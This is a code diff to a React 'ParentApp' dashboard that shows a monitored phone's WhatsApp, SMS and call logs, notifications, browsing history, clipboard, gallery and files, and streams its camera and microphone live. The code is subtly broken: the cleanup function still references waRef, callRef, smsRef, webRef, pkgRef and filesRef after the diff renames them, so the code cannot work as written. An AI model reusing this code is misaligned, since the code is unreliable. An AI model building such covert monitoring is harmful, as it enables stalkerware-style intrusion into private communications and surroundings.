@@ -10,11 +10,11 @@ import {
   User as FirebaseUser,
 } from "firebase/auth";
 import { ref, onValue, set, push, off, update, get, query, limitToLast } from "firebase/database";
-import { doc, setDoc } from "firebase/firestore";
+import { doc, setDoc, collection, query as fsQuery, orderBy, limit as fsLimit, onSnapshot } from "firebase/firestore";
 import { auth, rtdb, firestore } from "@/lib/firebase";
 import { WebRtcReceiver } from "@/lib/webrtc";
 import { AudioStreamReceiver } from "@/lib/audioStreamer";
-import ActivityLogList from "@/components/ActivityLogList";
+import ActivityLogList, { ActivityTabType } from "@/components/ActivityLogList";
 import ControlsPanel from "@/components/ControlsPanel";
 import ScheduleManager from "@/components/ScheduleManager";
 import {
@@ -100,15 +100,15 @@ export default function ParentApp() {
   const [schedDuration, setSchedDuration] = useState<number>(5);
   const [schedLabel, setSchedLabel] = useState<string>("Study Time Ambient");
 
-  // Activity Sub-Tabs: "whatsapp" | "calls" | "sms" | "notifications" | "web" | "apps" | "recordings" | "sim" | "clipboard" | "gallery" | "files"
-  const [activityTab, setActivityTab] = useState<
-    "whatsapp" | "calls" | "sms" | "notifications" | "web" | "apps" | "recordings" | "sim" | "clipboard" | "gallery" | "files"
-  >("whatsapp");
+  // Activity Sub-Tabs
+  const [activityTab, setActivityTab] = useState<ActivityTabType>("whatsapp");
 
   // Live Stream State
   const [isStreaming, setIsStreaming] = useState(false);
   const [streamType, setStreamType] = useState<"video" | "audio">("video");
-  const [cameraFacing, setCameraFacing] = useState<"front" | "back">("back");
+  const [cameraFacing, setCameraFacing] = useState<"front" | "back" | "ultrawide">("back");
+  const [streamDuration, setStreamDuration] = useState<number>(0);
+  const streamTimerRef = useRef<any>(null);
   const [streamStatusText, setStreamStatusText] = useState("Idle");
   const [isMuted, setIsMuted] = useState(false);
   const [audioBoostMultiplier, setAudioBoostMultiplier] = useState<number>(1.0);
@@ -140,6 +140,7 @@ export default function ParentApp() {
   const [isSirenActive, setIsSirenActive] = useState<boolean>(false);
   const [capturingFacing, setCapturingFacing] = useState<"front" | "back" | null>(null);
   const [isRefreshingLocation, setIsRefreshingLocation] = useState<boolean>(false);
+  const [securityAlerts, setSecurityAlerts] = useState<any[]>([]);
 
   // Cloud Storage Auto-Clean Retention Settings (Days: 1, 7, 14, 28, or 0 for Never)
   const [storageRetentionDays, setStorageRetentionDays] = useState<number>(7);
@@ -253,9 +254,9 @@ export default function ParentApp() {
   useEffect(() => {
     if (!activeChildId) return;
 
-    // WhatsApp Logs
-    const waRef = ref(rtdb, `whatsapp_logs/${activeChildId}`);
-    const unsubWa = onValue(waRef, (snap) => {
+    // WhatsApp Logs (Optimized: limitToLast(30))
+    const waQuery = query(ref(rtdb, `whatsapp_logs/${activeChildId}`), limitToLast(30));
+    const unsubWa = onValue(waQuery, (snap) => {
       const val = snap.val();
       if (val) {
         const arr = Object.values(val).reverse();
@@ -263,9 +264,9 @@ export default function ParentApp() {
       } else setWhatsappLogs([]);
     });
 
-    // Call Logs
-    const callRef = ref(rtdb, `call_logs/${activeChildId}`);
-    const unsubCall = onValue(callRef, (snap) => {
+    // Call Logs (Optimized: limitToLast(30))
+    const callQuery = query(ref(rtdb, `call_logs/${activeChildId}`), limitToLast(30));
+    const unsubCall = onValue(callQuery, (snap) => {
       const val = snap.val();
       if (val) {
         const arr = (val.logs || Object.values(val)).reverse();
@@ -273,9 +274,9 @@ export default function ParentApp() {
       } else setCallLogs([]);
     });
 
-    // SMS Logs
-    const smsRef = ref(rtdb, `sms_logs/${activeChildId}`);
-    const unsubSms = onValue(smsRef, (snap) => {
+    // SMS Logs (Optimized: limitToLast(30))
+    const smsQuery = query(ref(rtdb, `sms_logs/${activeChildId}`), limitToLast(30));
+    const unsubSms = onValue(smsQuery, (snap) => {
       const val = snap.val();
       if (val) {
         const arr = (val.logs || Object.values(val)).reverse();
@@ -283,19 +284,26 @@ export default function ParentApp() {
       } else setSmsLogs([]);
     });
 
-    // Notifications
-    const notifRef = ref(rtdb, `notifications/${activeChildId}`);
-    const unsubNotif = onValue(notifRef, (snap) => {
-      const val = snap.val();
-      if (val) {
-        const arr = (val.notifications || Object.values(val)).reverse();
+    // Notifications (Cloud Firestore - eliminates RTDB quota bloat)
+    const notifCol = fsQuery(
+      collection(firestore, "notifications", activeChildId, "items"),
+      orderBy("timestamp", "desc"),
+      fsLimit(50)
+    );
+    const unsubNotif = onSnapshot(
+      notifCol,
+      (snap) => {
+        const arr = snap.docs.map((d) => d.data());
         setNotifications(arr);
-      } else setNotifications([]);
-    });
+      },
+      (err) => {
+        console.warn("Firestore notifications error:", err);
+      }
+    );
 
-    // Web Browser History
-    const webRef = ref(rtdb, `web_history/${activeChildId}`);
-    const unsubWeb = onValue(webRef, (snap) => {
+    // Web Browser History (Optimized: limitToLast(30))
+    const webQuery = query(ref(rtdb, `web_history/${activeChildId}`), limitToLast(30));
+    const unsubWeb = onValue(webQuery, (snap) => {
       const val = snap.val();
       if (val) {
         const arr = (val.history || Object.values(val)).reverse();
@@ -303,9 +311,9 @@ export default function ParentApp() {
       } else setWebHistory([]);
     });
 
-    // App Events
-    const pkgRef = ref(rtdb, `package_events/${activeChildId}`);
-    const unsubPkg = onValue(pkgRef, (snap) => {
+    // App Events (Optimized: limitToLast(30))
+    const pkgQuery = query(ref(rtdb, `package_events/${activeChildId}`), limitToLast(30));
+    const unsubPkg = onValue(pkgQuery, (snap) => {
       const val = snap.val();
       if (val) {
         const arr = (val.events || Object.values(val)).reverse();
@@ -395,20 +403,26 @@ export default function ParentApp() {
       setIsSirenActive(snap.val()?.value === true);
     });
 
-    // Media Gallery Metadata Listener
-    const mediaRef = ref(rtdb, `media_gallery/${activeChildId}`);
-    const unsubMedia = onValue(mediaRef, (snap) => {
-      const val = snap.val();
-      if (val) {
-        const raw = Array.isArray(val) ? val : (val.items || Object.values(val));
-        const arr = Array.isArray(raw) ? [...raw].reverse() : [];
+    // Media Gallery Metadata Listener (Cloud Firestore - eliminates RTDB quota bloat)
+    const mediaCol = fsQuery(
+      collection(firestore, "media_gallery", activeChildId, "items"),
+      orderBy("dateAdded", "desc"),
+      fsLimit(50)
+    );
+    const unsubMedia = onSnapshot(
+      mediaCol,
+      (snap) => {
+        const arr = snap.docs.map((d) => d.data());
         setMediaGallery(arr);
-      } else setMediaGallery([]);
-    });
+      },
+      (err) => {
+        console.warn("Firestore media gallery error:", err);
+      }
+    );
 
-    // File Explorer Metadata Listener
-    const filesRef = ref(rtdb, `file_explorer/${activeChildId}`);
-    const unsubFiles = onValue(filesRef, (snap) => {
+    // File Explorer Metadata Listener (Optimized: limitToLast(50))
+    const filesQuery = query(ref(rtdb, `file_explorer/${activeChildId}`), limitToLast(50));
+    const unsubFiles = onValue(filesQuery, (snap) => {
       const val = snap.val();
       if (val) {
         const raw = Array.isArray(val) ? val : (val.files || Object.values(val));
@@ -447,20 +461,33 @@ export default function ParentApp() {
       } else setBlockedPackages({});
     });
 
+    // Security Alerts Listener (SIM Change, SIM Removal, Low Battery, etc.)
+    const alertsQuery = query(ref(rtdb, `alerts/${activeChildId}`), limitToLast(50));
+    const unsubAlerts = onValue(alertsQuery, (snap) => {
+      const val = snap.val();
+      if (val) {
+        const arr = Object.values(val).reverse();
+        setSecurityAlerts(arr);
+      } else {
+        setSecurityAlerts([]);
+      }
+    });
+
     return () => {
       off(waRef, "value", unsubWa);
       off(callRef, "value", unsubCall);
       off(smsRef, "value", unsubSms);
-      off(notifRef, "value", unsubNotif);
+      unsubNotif();
       off(webRef, "value", unsubWeb);
       off(pkgRef, "value", unsubPkg);
       off(simRef, "value", unsubSim);
       off(clipQuery, "value", unsubClip);
-      off(mediaRef, "value", unsubMedia);
+      unsubMedia();
       off(filesRef, "value", unsubFiles);
       off(schedRef, "value", unsubSched);
       off(installedAppsRef, "value", unsubInstalledApps);
       off(parentControlsRef, "value", unsubParentControls);
+      off(alertsQuery, "value", unsubAlerts);
       off(recQuery, "value", unsubRec);
       off(locRef, "value", unsubLoc);
       off(snapQuery, "value", unsubSnap);
@@ -576,6 +603,11 @@ export default function ParentApp() {
   const startStream = async () => {
     if (!activeChildId) return;
     setIsStreaming(true);
+    if (streamTimerRef.current) clearInterval(streamTimerRef.current);
+    setStreamDuration(0);
+    streamTimerRef.current = setInterval(() => {
+      setStreamDuration((prev) => prev + 1);
+    }, 1000);
 
     if (streamType === "audio") {
       setStreamStatusText("Connecting to phone microphone (WebAudio)...");
@@ -751,6 +783,11 @@ export default function ParentApp() {
 
   const stopStream = () => {
     stopRecordingStream();
+    if (streamTimerRef.current) {
+      clearInterval(streamTimerRef.current);
+      streamTimerRef.current = null;
+    }
+    setStreamDuration(0);
     if (audioReceiverRef.current) {
       audioReceiverRef.current.stop();
       audioReceiverRef.current = null;
@@ -769,7 +806,8 @@ export default function ParentApp() {
   };
 
   const toggleCamera = async () => {
-    const nextFacing = cameraFacing === "front" ? "back" : "front";
+    const nextFacing: "front" | "back" | "ultrawide" =
+      cameraFacing === "back" ? "ultrawide" : cameraFacing === "ultrawide" ? "front" : "back";
     setCameraFacing(nextFacing);
     if (rtcReceiverRef.current) {
       await rtcReceiverRef.current.switchCamera(nextFacing);
@@ -1397,16 +1435,22 @@ export default function ParentApp() {
 
               {/* Top Controls Overlay */}
               <div className="absolute top-3 right-3 z-20 flex items-center gap-2">
-                {/* 1. Camera Switch Button directly on screen */}
+                {/* 1. Camera Switch Button directly on screen (Rear 1x / Ultra-Wide 0.5x / Front) */}
                 {isStreaming && streamType === "video" && (
                   <button
                     type="button"
                     onClick={toggleCamera}
                     className="px-3 py-1.5 bg-black/70 hover:bg-black/90 backdrop-blur-md rounded-xl text-white text-xs font-semibold flex items-center gap-1.5 border border-white/20 shadow-lg cursor-pointer transition hover:scale-105 active:scale-95"
-                    title="Switch Camera (Front / Rear)"
+                    title="Switch Camera (1x Rear / 0.5x Ultra-Wide / Front)"
                   >
                     <RefreshCw className="w-3.5 h-3.5 text-blue-400" />
-                    <span>{cameraFacing === "front" ? "Front ↻" : "Rear ↻"}</span>
+                    <span>
+                      {cameraFacing === "ultrawide"
+                        ? "0.5x Ultra-Wide ↻"
+                        : cameraFacing === "front"
+                        ? "Front ↻"
+                        : "1x Rear ↻"}
+                    </span>
                   </button>
                 )}
 
@@ -1430,20 +1474,28 @@ export default function ParentApp() {
                       title="Click to stop and download recording to computer"
                     >
                       <StopCircle className="w-4 h-4 fill-white text-red-700" />
-                      <span>REC {formatSeconds(recordingDuration)} (Stop & Save)</span>
+                      <span>REC {formatSeconds(recordingDuration)} (Stop & Download)</span>
                     </button>
                   )
                 )}
               </div>
 
-              {/* Status Pill in Corner */}
-              <div className="absolute top-3 left-3 px-2.5 py-1 bg-black/60 backdrop-blur-md rounded-md text-[10px] font-semibold text-gray-200 flex items-center gap-1.5 border border-white/10 z-10">
-                <span
-                  className={`w-1.5 h-1.5 rounded-full ${
-                    isStreaming ? "bg-red-500 animate-ping" : "bg-gray-400"
-                  }`}
-                />
-                {streamStatusText}
+              {/* Status & Live Elapsed Time Pill in Corner */}
+              <div className="absolute top-3 left-3 flex items-center gap-2 z-10">
+                {isStreaming && (
+                  <div className="px-2.5 py-1 bg-red-600/90 backdrop-blur-md rounded-md text-[10px] font-black text-white flex items-center gap-1.5 shadow-md">
+                    <span className="w-2 h-2 rounded-full bg-white animate-pulse" />
+                    <span>LIVE {formatSeconds(streamDuration)}</span>
+                  </div>
+                )}
+                <div className="px-2.5 py-1 bg-black/60 backdrop-blur-md rounded-md text-[10px] font-semibold text-gray-200 flex items-center gap-1.5 border border-white/10">
+                  <span
+                    className={`w-1.5 h-1.5 rounded-full ${
+                      isStreaming ? "bg-green-400 animate-ping" : "bg-gray-400"
+                    }`}
+                  />
+                  {streamStatusText}
+                </div>
               </div>
 
               {/* Audio Unmute / Mute Toggle Button */}
@@ -1690,6 +1742,7 @@ export default function ParentApp() {
             snapshotsList={snapshotsList}
             handleRequestSnapshot={handleRequestSnapshot}
             capturingFacing={capturingFacing}
+            securityAlerts={securityAlerts}
           />
         )}
 
